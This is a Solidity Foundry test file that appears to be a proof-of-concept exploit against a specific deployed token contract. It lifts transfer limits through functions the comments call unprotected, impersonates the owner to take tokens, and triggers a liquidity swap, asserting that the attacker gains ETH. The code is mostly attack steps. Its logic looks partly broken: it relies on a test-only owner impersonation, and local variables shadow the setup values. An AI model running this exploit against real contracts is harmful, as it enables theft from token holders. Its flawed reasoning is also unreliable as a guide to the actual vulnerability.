// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface PocongNFT {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function swapAndLiquifyEnabled() external view returns (bool);
    function uniswapV2Pair() external view returns (address);
    function devWallet() external view returns (address);
    function owner() external view returns (address);
    function setMaxTxPercent(uint256) external;
    function setMaxWalletPercent(uint256) external;
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x5f5C745D399398a633D53cDC97b4eAeB7Cd135B7;
    address attacker = address(this);

    // State variables to persist data from setUp to testExploit
    PocongNFT token;
    uint256 threshold;
    uint256 tokenAmount;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = PocongNFT(TARGET);
        threshold = 2154 * 10**3 * 10**9; // numTokensSellToAddToLiquidity
        tokenAmount = threshold * 2; // Get double the threshold
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Remove transfer limits via unprotected public functions
        token.setMaxTxPercent(100);
        token.setMaxWalletPercent(100);

        // Record initial ETH balance
        uint256 initialEthBalance = address(this).balance;

        // Get owner and impersonate to get tokens
        address owner = token.owner();
        uint256 tokenAmount = 50000 * 10**3 * 10**9; // 50 million tokens

        // Impersonate owner to transfer tokens to attacker
        vm.prank(owner);
        token.transfer(address(this), tokenAmount);

        // Transfer tokens to contract to build up balance above threshold
        uint256 threshold = 2154 * 10**3 * 10**9;
        token.transfer(TARGET, threshold);

        // Trigger swapAndLiquify with another transfer
        // This swaps half the tokens for ETH and adds liquidity
        token.transfer(TARGET, threshold);

        // Record final ETH balance
        uint256 finalEthBalance = address(this).balance;

        // Assert that attacker's ETH balance increased
        assertGt(finalEthBalance, initialEthBalance, "Attacker ETH balance should increase");
    }

    receive() external payable {}
    fallback() external payable {}
}

